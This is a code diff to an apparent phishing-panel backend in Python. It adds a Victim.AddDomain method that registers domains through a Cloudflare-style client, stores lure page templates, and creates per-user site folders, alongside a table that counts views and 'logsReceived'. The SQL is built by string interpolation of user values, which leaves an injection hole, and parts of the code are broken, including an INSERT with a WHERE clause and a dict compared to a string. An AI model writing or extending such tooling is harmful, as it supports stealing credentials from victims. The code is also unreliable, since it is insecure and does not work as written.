@@ -2,6 +2,8 @@ from peewee import SqliteDatabase
 from datetime import datetime
 from os import mkdir
 from shutil import rmtree
+from config import clf
+
 
 class User:
 
@@ -62,11 +64,10 @@ class User:
                     "domain"	TEXT,
                     "servers"	TEXT,
                     "template"	TEXT,
-                    "security"	TEXT,
                     "status"	TEXT,
-                    "views"	INTEGER,
-                    "logsReceived"	INTEGER,
-                    "created_on"    DATETIME
+                    "views"	INTEGER DEFAULT 0,
+                    "logsReceived"	INTEGER DEFAULT 0,
+                    "created_on"	DATETIME
                 );
                 """)
 
@@ -116,3 +117,26 @@ class Victim:
             conn.commit()
             data = cursor.fetchall()
             return data
+        
+
+    def AddDomain(self, domain, page, path, redirect, countries, username):
+        added_domain = clf.AddDomain(domain)
+        if added_domain:
+            zones = clf.getDomains()
+            for zone in zones:
+                if zone == domain:
+                    zone_id = zone['id']
+                    status = zone['status']
+                    name_servers = zone['name_servers']
+
+                    with SqliteDatabase(self.database_path) as conn:
+                        cursor = conn.cursor()
+                        cursor.execute(f"INSERT INTO domains(domain, zone_id, servers, status, template, created_on) VALUES('{domain}', '{zone_id}', '{name_servers}', '{status}', '{page}', {datetime.utcnow()}) WHERE username = '{username}'")
+                        conn.commit()
+                        mkdir(f"users/{username}/websites/{domain}")
+                        f = open(f"users/{username}/websites/{domain}/index.html", 'w')
+                        f.close()
+                        return True
+            return False
+        else:
+            return False
